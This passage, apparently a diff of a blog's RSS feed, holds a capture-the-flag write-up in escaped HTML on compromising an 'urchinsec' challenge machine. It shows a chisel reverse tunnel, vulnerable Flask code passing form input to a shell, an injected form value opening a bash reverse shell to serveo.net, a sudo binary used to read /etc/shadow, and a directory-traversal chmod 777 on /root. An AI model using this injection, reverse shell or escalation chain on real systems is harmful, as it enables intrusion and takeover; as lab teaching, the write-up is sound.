+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      38132/python3       
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::5355                 :::*                    LISTEN      -                   
+tcp6       0      0 :::3306                 :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
+tcp6       0      0 :::3333                 :::*                    LISTEN      - 
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;As you see above there is a service on port 8080 that is only accessed internally.&lt;/p&gt;
+&lt;p&gt;To access this from our attack box we will need to use a tunnel client like chisel. You can get chisel &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://github.com/jpillora/chisel&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;on attackbox &amp;gt;&amp;gt; ./chisel server -p 8000 --reverse
+on chal machine  &amp;gt;&amp;gt; ./chisel client &amp;lt;ip&amp;gt;:8000 R:8001:127.0.0.1:8080
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;After this we can access the service on port 80 which is the sesame application we got the src earlier.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;On the sesame applicatiion we login with the creds we found in the sqlite db file.&lt;/p&gt;
+&lt;p&gt;If you read the src this application is used by bill to read files in the server.&lt;/p&gt;
+&lt;p&gt;There is nothing else interesting so i looked through the source code.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;
+in main.py
+
+def dashboard():
+    if request.method == &amp;#34;GET&amp;#34;:
+        return render_template(&amp;#39;dash.html&amp;#39;)
+    if request.method == &amp;#34;POST&amp;#34;:
+        key = request.form.get(&amp;#34;key&amp;#34;)
+        file_read = request.form.get(&amp;#34;fileread&amp;#34;)
+        check_key = SesameKey.query.filter_by(key=key).first()
+        if check_key is not None:
+            num = 107
+            stk = chr(num)
+            secret = &amp;#39;&amp;#39;.join([chr(ord(x) ^ ord(stk)) for x in key])
+            with open(&amp;#34;temp_secret&amp;#34;, &amp;#34;w&amp;#34;) as temp:
+                temp.write(secret)
+            command = f&amp;#34;sudo sesame -i temp_secret -r {file_read}&amp;#34;
+            run = subprocess.check_output(command, shell=True)
+            run = run.decode(&amp;#39;utf-8&amp;#39;)
+
+            os.system(f&amp;#34;rm -rf temp_secret&amp;#34;)
+
+            return render_template(&amp;#39;dash.html&amp;#39;, message=&amp;#34;It Works&amp;#34;)
+        else:
+            return render_template(&amp;#39;dash.html&amp;#39;, message=&amp;#34;Wrong Key&amp;#34;)
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;If you look carefully our user input is not being sanitized and it is being put directly to subprocess module. Seeing this you immediately think command execution.&lt;/p&gt;
+&lt;p&gt;The catch is that the output of a command you run will not be displayed.&lt;/p&gt;
+&lt;p&gt;So after some trial i created:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/urchinsec/cmd.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;cmd&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;key=IpwnEazy@@#TH!ngG5~&amp;amp;fileread=/etc/passwd; bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/serveo.net/33997 0&amp;gt;&amp;amp;1&amp;#34;&amp;amp;action=
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This gets  us  a reverse shell. We are now the user bill. From here i created ssh keys so that i could login via ssh which is better and more stable.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/urchinsec/ssh.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ssh&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Our target now us to achieve root.&lt;/p&gt;
+&lt;p&gt;Running sudo -l we can see that our user can run &amp;ldquo;sesame&amp;rdquo; command with sudo rights.&lt;/p&gt;
+&lt;p&gt;This command is used earlier in the python application&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;Running : sudo sesame -i temp_secret -r /etc/shadow 
+
+Note: shadow file is only read by root so with this  command we can read files as the root user.
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/urchinsec/shadoww.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;shadow&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;
+Error: -i is a required argument
+Usage of sesame:
+  -h	Prints This Output
+  -i string
+    	Input Secret File To Read Secret (-i /path/to/secret.txt)
+  -r string
+    	File To Read (-r /path/to/filetoread.txt)
+  -s	Change Permissions Of Files
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;It also supports changing of file permissions with -s flag.&lt;/p&gt;
+&lt;p&gt;SO in order to read the root flag we can exploit this. So after some trial and error i did this:&lt;/p&gt;
+&lt;p&gt;The binary only allowed to set permissions in the sesame/test directory, but it was also vulnerable to directory transversal.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;sudo sesame -i temp_secret -s 
+
+
+When it prompts for a file enter 
+
+
+../../../../../../root/.
+
+
+When it prompts for permission 
+
+777
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This above will make the root permission be rwx by everyone.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;. (dot): This refers to the current directory. For example, if you&amp;#39;re in the directory /home/user, then . refers to /home/user.
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;From here you can read the root flag&lt;/p&gt;
+&lt;p&gt;flag : urchinsec{I_know_CTF_This_S3rV35_IS_we334akK_NEXTTTT}&lt;/p&gt;
+&lt;hr&gt;
+</description>
+        </item>
+        <item>
         <title>HTB_cyberapocalypse_2024</title>
         <link>https://f0rk3b0mb.github.io/p/htb_cyberapocalypse_2024/</link>
         <pubDate>Mon, 11 Mar 2024 13:23:40 +0300</pubDate>
